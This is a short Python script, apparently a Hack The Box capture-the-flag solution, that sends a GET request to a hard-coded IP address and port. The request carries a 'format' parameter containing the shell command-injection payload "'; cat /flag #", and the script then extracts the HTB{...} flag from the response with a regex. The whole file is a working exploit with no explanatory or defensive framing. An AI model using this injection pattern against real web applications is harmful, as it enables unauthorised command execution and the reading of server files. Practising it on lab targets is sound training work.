import requests
import re

url = "http://206.189.21.230:37180/"

r = requests.get(
    url,
    params={
        "format": "'; cat /flag #",
    },
)

m = re.search(r"HTB{.*?}", r.text)
if m:
    print(m.group())
else:
    print("[-] we failed to find the bug")


